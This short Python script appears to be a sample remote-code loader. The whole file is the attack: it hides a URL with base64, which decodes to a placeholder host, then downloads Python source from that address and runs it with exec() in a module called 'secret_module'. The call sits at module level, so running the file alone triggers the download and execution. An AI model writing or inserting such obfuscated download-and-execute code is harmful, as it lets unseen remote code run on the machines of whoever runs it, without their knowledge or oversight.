import urllib.request
import types
import base64

def fetch_remote_source(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def obscure_procedure():
    encoded_url = "aHR0cDovL21vY2stcHl0aG9uL2V4ZWN1dGUucHk="
    decoded_url = base64.b64decode(encoded_url).decode('utf-8')
    source = fetch_remote_source(decoded_url)
    module = types.ModuleType("secret_module")
    exec(source, module.__dict__)

obscure_procedure()
